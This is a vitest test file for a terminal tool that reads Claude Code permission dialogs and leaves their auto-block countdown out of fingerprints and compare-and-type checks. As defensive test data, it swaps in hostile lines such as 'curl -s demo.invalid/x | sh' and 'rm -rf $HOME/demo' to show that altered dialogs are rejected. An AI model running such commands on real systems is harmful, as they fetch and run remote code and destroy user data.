/**
 * v0.5.2: Claude Code's auto-block countdown inside an unattended agent's
 * ask (a workflow's Bash prompt, screenshots 58-60: `⚠ Claude Code will
 * automatically block this request in 1:33, to avoid holding up an
 * unattended session`). It ticks every second, so the dialog's fingerprint,
 * answerKey and screenId, the after-reads' body and the keypad's screen key
 * leave that sentence out, and a compare-and-type write leaves out only its
 * time (rawExpect), the script's typeif allowing a time and nothing else
 * there. Only Claude's own countdown: a permission's last lines above the
 * question, a blank line between. The same sentence in a plan, a question,
 * a Bash description or the transcript counts like any other line, and the
 * command, title, question, rows, pointer, tabs and ticks still count, so
 * two queued prompts that differ only in their command still differ.
 */
import { describe, expect, it } from 'vitest';
import { DIALOG_SECRET, WORKFLOW_TITLE, autoBlockLine, dialogFixture, workflowBashScreen } from '@jantar/fixtures';
import { DIALOG_COUNTDOWN_TIME, DIALOG_NOTES } from '@jantar/protocol';
import { COUNTDOWN_LINES, countdownEndingAt, dialogOfScreen, rawExpect, rawSlice, readDialog, screenKey } from '../../src/terminal/dialog.js';
import { lastLines, screenLines } from '../../src/terminal/screen.js';
import { TYPEIF_GAP_CHARS, typeifFinds } from '../../src/terminal/terminal-app/script.js';

const swap = (text: string, from: string, to: string) => {
  expect(text.includes(from), from).toBe(true);
  return text.replace(from, to);
};
/** The countdown line(s) of a 96-column workflow prompt at `time`, as drawn. */
const drawnAt = (time: string) => {
  const lines = screenLines(workflowBashScreen(time));
  const at = lines.findIndex((l) => l.includes('automatically block'));
  return lines.slice(at, at + 2).join('\n');
};
const print = (screen: string) => dialogOfScreen(screen).dialog?.fingerprint;
/** What a compare-and-type write on the dialog of `screen` must find. */
const expectOf = (screen: string) => {
  const r = readDialog(screen);
  if (!r.block) throw new Error('no block');
  return rawExpect(screen, r.block.from, r.block.to, r.countdown);
};
/** The sentence alone on one line of `lines` (the last), as countdownEndingAt sees it. */
const alone = (s: string) => countdownEndingAt(['before', ` ${s}`], 1, 0);

describe('countdownEndingAt', () => {
  it('finds the countdown as Claude draws it: wrapped or on one line, any M:SS, with or without ⚠, and its "about" form', () => {
    const wrapped = screenLines(workflowBashScreen('1:33'));
    const start = wrapped.findIndex((l) => l.includes('automatically block'));
    expect(countdownEndingAt(wrapped, start + 1, 0)).toEqual({ from: start, to: start + 1, time: '1:33' });
    // Screenshot 59's width: one line.
    const wide = screenLines(workflowBashScreen('0:05', { cols: 152 }));
    const one = wide.findIndex((l) => l.includes('automatically block'));
    expect(countdownEndingAt(wide, one, 0)).toEqual({ from: one, to: one, time: '0:05' });
    const sentences = [
      autoBlockLine('12:00'),
      autoBlockLine('0:59'),
      autoBlockLine('about 2 minutes'),
      autoBlockLine('about 1 minute'),
      autoBlockLine('about 40 seconds'),
      autoBlockLine('1:33').replace('⚠ ', ''),
      autoBlockLine('1:33').replace('⚠ ', '⚠️ '),
    ];
    for (const s of sentences) {
      const found = alone(s);
      expect(found, s).toMatchObject({ from: 1, to: 1 });
      expect(DIALOG_COUNTDOWN_TIME.test(found?.time ?? ''), s).toBe(true);
    }
    // Wrapped over three or four lines in a narrow window.
    expect(countdownEndingAt([' ⚠ Claude Code will automatically block this', ' request in 1:33, to avoid holding up an', ' unattended session'], 2, -1)).toEqual({
      from: 0,
      to: 2,
      time: '1:33',
    });
    expect(COUNTDOWN_LINES).toBe(4);
    expect(countdownEndingAt([' ⚠ Claude Code will', ' automatically block this request in', ' 1:33, to avoid holding up an', ' unattended session'], 3, -1)).toEqual({
      from: 0,
      to: 3,
      time: '1:33',
    });
  });

  it("finds nothing but that sentence as 2.1.316 draws it: another word, other case, a time it never prints, a box's line", () => {
    const not = [
      autoBlockLine('1:33').replace('block', 'allow'),
      autoBlockLine('1:33').replace('unattended session', 'unattended session now'),
      autoBlockLine('1:33').replace('Claude Code', 'Claude'),
      autoBlockLine('1:33').toUpperCase(),
      autoBlockLine('About 1 Minute'),
      autoBlockLine('5'),
      autoBlockLine('45s'),
      autoBlockLine('100:00'),
      autoBlockLine('soon'),
      autoBlockLine('1:3'),
      autoBlockLine('1:33 or 1:34'),
      `│ ${autoBlockLine('1:33')}`,
      `echo "${autoBlockLine('1:33')}"`,
    ];
    for (const s of not) expect(alone(s), s).toBeNull();
    // A blank line ends a wrapped sentence, it never runs past four lines, and never above `after`.
    expect(countdownEndingAt([' ⚠ Claude Code will automatically block this request in 1:33,', '', ' to avoid holding up an unattended session'], 2, -1)).toBeNull();
    expect(countdownEndingAt([' ⚠ Claude Code', ' will automatically', ' block this request', ' in 1:33, to avoid holding', ' up an unattended session'], 4, -1)).toBeNull();
    expect(countdownEndingAt([' ⚠ Claude Code will automatically block this', ' request in 1:33, to avoid holding up an', ' unattended session'], 2, 0)).toBeNull();
  });
});

describe('the dialog leaves its own countdown out, and nothing else', () => {
  it('a tap made at 1:33 is still good at 1:32 and at 0:05: one fingerprint, answerKey and screenId; blocksIn says the time', () => {
    const reads = ['PERM_WORKFLOW_133', 'PERM_WORKFLOW_132', 'PERM_WORKFLOW_005'].map((n) => readDialog(dialogFixture(n).screen));
    const [a, b, c] = reads as [ReturnType<typeof readDialog>, ReturnType<typeof readDialog>, ReturnType<typeof readDialog>];
    expect(a.dialog?.fingerprint).toMatch(/^[0-9a-f]{64}$/);
    for (const r of [b, c]) {
      expect(r.dialog?.fingerprint).toBe(a.dialog?.fingerprint);
      expect(r.answerKey).toBe(a.answerKey);
      expect(r.screenId).toBe(a.screenId);
      expect(r.bodyLines).toEqual(a.bodyLines);
      expect(r.block).toEqual(a.block);
      expect({ from: r.countdown?.from, to: r.countdown?.to }).toEqual({ from: a.countdown?.from, to: a.countdown?.to });
    }
    expect(reads.map((r) => r.dialog?.blocksIn)).toEqual(['1:33', '1:32', '0:05']);
    expect(reads.map((r) => r.countdown?.time)).toEqual(['1:33', '1:32', '0:05']);
    expect(a.dialog?.title).toBe(WORKFLOW_TITLE);
    // The long command box (42 body lines, clipped for the phone) ticks the same way.
    expect(print(dialogFixture('PERM_WORKFLOW_LONG_132').screen)).toBe(print(dialogFixture('PERM_WORKFLOW_LONG_133').screen));
    expect(print(dialogFixture('PERM_WORKFLOW_LONG_133').screen)).not.toBe(a.dialog?.fingerprint);
  });

  it("the countdown is in neither the phone's body nor the after-reads' body, and the block still runs from the title to the hint", () => {
    const screen = dialogFixture('PERM_WORKFLOW_133').screen;
    const r = readDialog(screen);
    for (const line of [...(r.dialog?.body ?? []), ...r.bodyLines]) {
      expect(line).not.toMatch(/automatically block|^session$/u);
    }
    expect(r.dialog?.body.at(-1)).toBe('│ Dangerous rm operation on statically-unresolvable target: $T/out/*');
    const lines = screenLines(screen);
    expect(lines[r.block?.from ?? -1]).toBe(` ${WORKFLOW_TITLE}`);
    expect(lines[r.block?.to ?? -1]).toBe(' Esc to cancel · Tab to amend');
    expect(lines.slice(r.countdown?.from, (r.countdown?.to ?? 0) + 1).join('\n')).toBe(drawnAt('1:33'));
    expect(rawSlice(screen, r.block?.from ?? 0, r.block?.to ?? 0)).toContain(DIALOG_SECRET);
  });

  it('one fingerprint at any width and in any form Claude draws it: 152 columns (one line), 10:00 (wrapped elsewhere), "about", no ⚠', () => {
    const base = print(workflowBashScreen('1:33'));
    const variants = {
      wide: workflowBashScreen('1:33', { cols: 152 }),
      tenMinutes: workflowBashScreen('10:00'),
      about: workflowBashScreen('about 2 minutes'),
      aboutSeconds: workflowBashScreen('about 59 seconds'),
      noGlyph: swap(workflowBashScreen('1:33'), ' ⚠ Claude', ' Claude'),
      oneLine: swap(workflowBashScreen('1:33'), drawnAt('1:33'), ` ${autoBlockLine('1:33')}`),
    };
    for (const [name, screen] of Object.entries(variants)) {
      expect(print(screen), name).toBe(base);
      expect(readDialog(screen).screenId, name).toBe(readDialog(workflowBashScreen('1:33')).screenId);
    }
    expect(dialogOfScreen(variants.about).dialog?.blocksIn).toBe('about 2 minutes');
    // Without any countdown it is the same request: nothing of what the user chooses on changed.
    expect(print(swap(workflowBashScreen('1:33'), `${drawnAt('1:33')}\n`, ''))).toBe(base);
    expect(dialogOfScreen(swap(workflowBashScreen('1:33'), `${drawnAt('1:33')}\n`, '')).dialog?.blocksIn).toBeUndefined();
  });

  it('two queued workflow prompts that differ only in their command differ, whatever either countdown shows', () => {
    const a = dialogFixture('PERM_WORKFLOW_TWIN_A').screen;
    const b = dialogFixture('PERM_WORKFLOW_TWIN_B').screen;
    expect(print(a)).not.toBe(print(b));
    expect(readDialog(a).screenId).not.toBe(readDialog(b).screenId);
    expect(readDialog(a).answerKey).toBe(readDialog(b).answerKey);
    const tickA = swap(a, 'in 1:58,', 'in 1:12,');
    const tickB = swap(b, 'in 1:58,', 'in 0:40,');
    expect(print(tickA)).toBe(print(a));
    expect(print(tickB)).toBe(print(b));
    expect(print(tickA)).not.toBe(print(tickB));
  });

  it('a changed command, description, warning, title, question, label, row count or pointer still changes it', () => {
    const base = workflowBashScreen('1:33');
    const changed = {
      command: swap(base, 'rm -rf $T/out/*; done', 'rm -rf $T/src/*; done'),
      description: swap(base, 'Check the rebuilt trees in bash', 'Check the rebuilt tree in bash'),
      warning: swap(base, 'target: $T/out/*', 'target: $T/*'),
      title: swap(base, '"night-check" workflow', '"day-check" workflow'),
      question: swap(base, ' Do you want to proceed?', ' Do you want to run it?'),
      label: swap(base, '   2. No', '   2. No, and tell Claude what to do differently (esc)'),
      count: swap(base, '   2. No', '   2. Yes, and always allow access to /tmp/demo from this project\n   3. No'),
      pointer: swap(swap(base, ' ❯ 1. Yes', '   1. Yes'), '   2. No', ' ❯ 2. No'),
    };
    const fp = print(base);
    for (const [what, screen] of Object.entries(changed)) {
      const d = dialogOfScreen(screen).dialog;
      expect(d, what).not.toBeNull();
      expect(d?.fingerprint, what).not.toBe(fp);
      expect(d?.blocksIn, what).toBe('1:33');
    }
  });

  it('a sentence that is not exactly the countdown stays in the body and the fingerprint', () => {
    const base = workflowBashScreen('1:33');
    const others = {
      allow: swap(base, drawnAt('1:33'), ' ⚠ Claude Code will automatically allow this request in 1:33, to avoid holding up an\n unattended session'),
      capitals: swap(base, drawnAt('1:33'), drawnAt('1:33').toUpperCase()),
      bareCount: swap(base, drawnAt('1:33'), ` ${autoBlockLine('45')}`),
    };
    for (const [what, other] of Object.entries(others)) {
      const d = dialogOfScreen(other).dialog;
      expect(d?.body.some((l) => /automatically (?:allow|block)|AUTOMATICALLY BLOCK/u.test(l)), what).toBe(true);
      expect(d?.blocksIn, what).toBeUndefined();
      expect(readDialog(other).countdown, what).toBeNull();
      expect(d?.fingerprint, what).not.toBe(print(base));
    }
    expect(print(swap(others.allow, 'in 1:33', 'in 1:32'))).not.toBe(print(others.allow));
  });

  it('a workflow prompt taller than the window gets no buttons (its top is off screen), but its countdown is still read', () => {
    const tall = lastLines(dialogFixture('PERM_WORKFLOW_LONG_133').screen, 24).join('\n');
    expect(dialogOfScreen(tall)).toEqual({ dialog: null, note: DIALOG_NOTES.unsure, block: null });
    expect(readDialog(tall).countdown?.time).toBe('1:33');
    expect(readDialog(tall).screenId).toBe(readDialog(lastLines(dialogFixture('PERM_WORKFLOW_LONG_132').screen, 24).join('\n')).screenId);
  });
});

describe("only Claude's own countdown: the same sentence written by the model counts like any line", () => {
  const SENTENCE = autoBlockLine('1:33');

  /** `screen` with `line` put right after the dialog's first body line, at that line's indent. */
  function withLineInBody(screen: string, line: string): string {
    const r = readDialog(screen);
    const first = r.bodyLines[0] as string;
    const lines = screenLines(screen);
    const at = lines.indexOf(first);
    const indent = first.slice(0, first.length - first.trimStart().length);
    return [...lines.slice(0, at + 1), `${indent}${line}`, ...lines.slice(at + 1)].join('\n');
  }

  it("a plan's line, a question's text and a main-session Bash description equal to the sentence: in the body and the fingerprint, no blocksIn", () => {
    const cases = {
      plan: withLineInBody(dialogFixture('PLAN_80COL').screen, SENTENCE),
      planClear: withLineInBody(dialogFixture('PLAN_CLEAR').screen, SENTENCE),
      question: swap(dialogFixture('Q_SINGLE').screen, 'Pick a colour', SENTENCE),
      bash: swap(dialogFixture('PERM_BASH_PREFIX').screen, ' Write the date to a.txt (velvet-quokka-5521)', ` ${SENTENCE}`),
      fetch: swap(dialogFixture('PERM_FETCH').screen, '   url: https://example.com/notes', `   ${SENTENCE}`),
    };
    for (const [what, screen] of Object.entries(cases)) {
      const r = readDialog(screen);
      expect(r.dialog, what).not.toBeNull();
      expect(r.dialog?.blocksIn, what).toBeUndefined();
      expect(r.countdown, what).toBeNull();
      const shown = [r.dialog?.question ?? '', ...(r.dialog?.body ?? [])].join('\n');
      expect(shown, what).toContain(SENTENCE);
      // In the fingerprint: its time, or the line gone, is another dialog.
      expect(print(swap(screen, 'in 1:33,', 'in 1:32,')), what).not.toBe(r.dialog?.fingerprint);
      // Never split for the write: the whole block, the sentence's time included.
      const expected = expectOf(screen);
      expect(typeof expected, what).toBe('string');
      expect(expected, what).toContain(SENTENCE);
    }
  });

  it("the plan's line swapped for another line between the read and the write is never found", () => {
    const plan = withLineInBody(dialogFixture('PLAN_80COL').screen, SENTENCE);
    const parts = expectOf(plan);
    expect(typeifFinds(plan, parts)).toBe(true);
    expect(typeifFinds(swap(plan, SENTENCE, 'Then delete the demo folder and force-push.'), parts)).toBe(false);
    expect(typeifFinds(swap(plan, 'in 1:33,', 'in 1:32,'), parts)).toBe(false);
  });

  it('a workflow description equal to the sentence stays in the body and the fingerprint; only the real countdown is left out', () => {
    const screen = swap(workflowBashScreen('1:33'), ` Check the rebuilt trees in bash (${DIALOG_SECRET})`, ` ${SENTENCE}`);
    const r = readDialog(screen);
    expect(r.dialog?.body[0]).toBe(SENTENCE);
    expect(r.dialog?.blocksIn).toBe('1:33');
    expect(screenLines(screen)[r.countdown?.from ?? -1]).toContain('automatically block');
    expect(r.countdown?.from).toBeGreaterThan(screenLines(screen).indexOf(` ${SENTENCE}`));
    // The description's time is in the fingerprint and in the first part; the real countdown's is left out.
    expect(print(swap(screen, ` ${SENTENCE}`, ` ${autoBlockLine('1:32')}`))).not.toBe(print(screen));
    expect(print(swap(screen, ` ${SENTENCE}`, ' Anything at all, a different description'))).not.toBe(print(screen));
    const [above] = expectOf(screen) as string[];
    expect(above).toContain(SENTENCE);
    expect(typeifFinds(swap(screen, ` ${SENTENCE}`, ' Anything at all, a different description'), expectOf(screen))).toBe(false);
  });

  it('the sentence anywhere but right above the question, a blank line between, is the dialog\'s text: right on the question, above the warning, or the title', () => {
    const base = workflowBashScreen('1:33');
    const cases = {
      // No blank line between it and the question: Claude's margin is missing, so it is the question's paragraph or text.
      noMargin: swap(base, `${drawnAt('1:33')}\n\n\n`, `${drawnAt('1:33')}\n`),
      // Another line of the dialog between it and the question.
      lineUnder: swap(base, `${drawnAt('1:33')}\n`, `${drawnAt('1:33')}\n │ one more line of the command\n`),
    };
    for (const [what, screen] of Object.entries(cases)) {
      const r = readDialog(screen);
      expect(r.countdown, what).toBeNull();
      expect(r.dialog?.blocksIn, what).toBeUndefined();
      expect(print(swap(screen, 'in 1:33,', 'in 1:32,')), what).not.toBe(print(screen));
    }
  });
});

describe('rawExpect: what a compare-and-type write still finds', () => {
  it('without a countdown: the raw block itself, exactly as rawSlice cuts it', () => {
    for (const name of ['PERM_CREATE_2', 'PERM_RAW_SPACES', 'PLAN_FULLSCREEN', 'Q_TABS', 'PERM_BASH_LONG']) {
      const screen = dialogFixture(name).screen;
      const { block } = dialogOfScreen(screen);
      expect(expectOf(screen), name).toBe(rawSlice(screen, block?.from ?? 0, block?.to ?? 0));
      expect(rawExpect(screen, block?.from ?? 0, block?.to ?? 0, null), name).toBe(rawSlice(screen, block?.from ?? 0, block?.to ?? 0));
    }
  });

  it("with one: two parts around its time alone, the countdown's words, indent and line ends kept in them", () => {
    for (const [name, time] of [
      ['PERM_WORKFLOW_133', '1:33'],
      ['PERM_WORKFLOW_LONG_133', '1:33'],
      ['PERM_WORKFLOW_TWIN_B', '1:58'],
    ] as const) {
      const screen = dialogFixture(name).screen;
      const { block } = dialogOfScreen(screen);
      const parts = expectOf(screen);
      expect(Array.isArray(parts), name).toBe(true);
      expect(parts, name).toHaveLength(2);
      const [above, below] = parts as [string, string];
      const whole = rawSlice(screen, block?.from ?? 0, block?.to ?? 0);
      // The whole block is the first part, the time alone, then the second part.
      expect(`${above}${time}${below}`, name).toBe(whole);
      expect(above.startsWith(` ${WORKFLOW_TITLE}`), name).toBe(true);
      expect(above.endsWith('$T/out/*\n ⚠ Claude Code will automatically block this request in '), name).toBe(true);
      expect(below.startsWith(', to avoid holding up an unattended\n session\n\n\n Do you want to proceed?'), name).toBe(true);
      expect(below.endsWith(' Esc to cancel · Tab to amend'), name).toBe(true);
      for (const p of parts) expect(screen.includes(p), name).toBe(true);
    }
    // The "about N" form: only N is left out.
    const about = workflowBashScreen('about 2 minutes');
    const [above, below] = expectOf(about) as [string, string];
    expect(above.endsWith('request in about ')).toBe(true);
    expect(below.startsWith(' minutes, to avoid')).toBe(true);
  });

  it('a countdown outside the lines asked for, or whose time cannot be told apart, gives the whole slice', () => {
    const screen = workflowBashScreen('1:33');
    const r = readDialog(screen);
    const c = r.countdown as NonNullable<typeof r.countdown>;
    expect(rawExpect(screen, c.to + 1, r.block?.to ?? 0, c)).toBe(rawSlice(screen, c.to + 1, r.block?.to ?? 0));
    expect(rawExpect(screen, r.block?.from ?? 0, c.from, c)).toBe(rawSlice(screen, r.block?.from ?? 0, c.from));
    // Two times in its text (it never reads so; a caller's mistake): no cut.
    const twice = swap(screen, 'unattended\n session', 'unattended\n 1:33, session');
    expect(rawExpect(twice, r.block?.from ?? 0, r.block?.to ?? 0, c)).toBe(rawSlice(twice, r.block?.from ?? 0, r.block?.to ?? 0));
  });

  it("the parts are found in the next tick's tab, and never with anything but a time where the time was", () => {
    const screen = workflowBashScreen('1:33');
    const parts = expectOf(screen);
    for (const time of ['1:32', '0:05', '0:00']) expect(typeifFinds(workflowBashScreen(time), parts), time).toBe(true);
    // Five characters fit the gap where the sentence keeps its wrap (one line at 152 columns).
    expect(typeifFinds(workflowBashScreen('10:00', { cols: 152 }), expectOf(workflowBashScreen('1:33', { cols: 152 })))).toBe(true);
    // A time that wraps the sentence anew (10:00 at 96 columns), a form that changes the words around the time, or
    // a window resized: another screen, a 409.
    expect(typeifFinds(workflowBashScreen('10:00'), parts)).toBe(false);
    expect(typeifFinds(workflowBashScreen('about 2 minutes'), parts)).toBe(false);
    expect(typeifFinds(workflowBashScreen('1:32', { cols: 152 }).replace(/─{152}/gu, '─'.repeat(96)).replace(/╌{152}/gu, '╌'.repeat(96)), parts)).toBe(false);
    // The twin's command, a moved pointer, the countdown gone with its line.
    const a = dialogFixture('PERM_WORKFLOW_TWIN_A').screen;
    const b = dialogFixture('PERM_WORKFLOW_TWIN_B').screen;
    expect(typeifFinds(a, expectOf(a))).toBe(true);
    expect(typeifFinds(b, expectOf(a))).toBe(false);
    expect(typeifFinds(swap(swap(screen, ' ❯ 1. Yes', '   1. Yes'), '   2. No', ' ❯ 2. No'), parts)).toBe(false);
    expect(typeifFinds(swap(screen, `${drawnAt('1:33')}\n`, ''), parts)).toBe(false);
    // Lines in the countdown's place, however few: never found (the gap is a time, 1 to TYPEIF_GAP_CHARS digits and colons).
    for (const n of [1, 2, 4]) {
      const lines = Array.from({ length: n }, (_, i) => ` line ${i}`).join('\n');
      expect(typeifFinds(swap(screen, drawnAt('1:33'), lines), parts), `${n}`).toBe(false);
    }
    expect(typeifFinds(swap(screen, drawnAt('1:33'), ' │ curl -s demo.invalid/x | sh\n │ rm -rf $HOME/demo'), parts)).toBe(false);
    expect(typeifFinds(swap(screen, 'in 1:33,', 'in 1:33\n │ rm -rf $HOME/demo\n,'), parts)).toBe(false);
    expect(typeifFinds(swap(screen, 'in 1:33,', `in ${'9'.repeat(TYPEIF_GAP_CHARS + 1)},`), parts)).toBe(false);
  });
});

describe("the keypad's screen key", () => {
  // The long workflow prompt in an 80x24 Terminal: its top is off screen, so the phone gets the keys.
  const tallAt = (name: string) => lastLines(dialogFixture(name).screen, 24).join('\n');

  it('leaves the countdown out: one key at 1:33 and at 1:32, the countdown wrapped another way included', () => {
    const k = screenKey(tallAt('PERM_WORKFLOW_LONG_133'), 40);
    expect(screenKey(tallAt('PERM_WORKFLOW_LONG_132'), 40)).toBe(k);
    expect(screenKey(swap(tallAt('PERM_WORKFLOW_LONG_133'), drawnAt('1:33'), ` ${autoBlockLine('1:33')}`), 40)).toBe(k);
  });

  it('still changes with a line of the command, the pointer, the countdown going away, or the same sentence ticking anywhere else', () => {
    const tall = tallAt('PERM_WORKFLOW_LONG_133');
    const k = screenKey(tall, 40);
    expect(screenKey(swap(tall, 'line 30 of the notes', 'line 30 of the note'), 40)).not.toBe(k);
    expect(screenKey(swap(swap(tall, ' ❯ 1. Yes', '   1. Yes'), '   2. No', ' ❯ 2. No'), 40)).not.toBe(k);
    expect(screenKey(swap(tall, `${drawnAt('1:33')}\n`, ''), 40)).not.toBe(k);
    // The sentence in the command's text, or in the transcript above a screen with no dialog: hashed as it is.
    const inBox = swap(tall, '│   line 30 of the notes', `│ ${autoBlockLine('1:33')}`);
    expect(screenKey(swap(inBox, `│ ${autoBlockLine('1:33')}`, `│ ${autoBlockLine('1:32')}`), 40)).not.toBe(screenKey(inBox, 40));
    const transcript = ['● Output:', ` ${autoBlockLine('1:33')}`, '', '❯ 1. one', '  2. two'].join('\n');
    expect(screenKey(transcript.replace('1:33', '1:32'), 40)).not.toBe(screenKey(transcript, 40));
  });
});
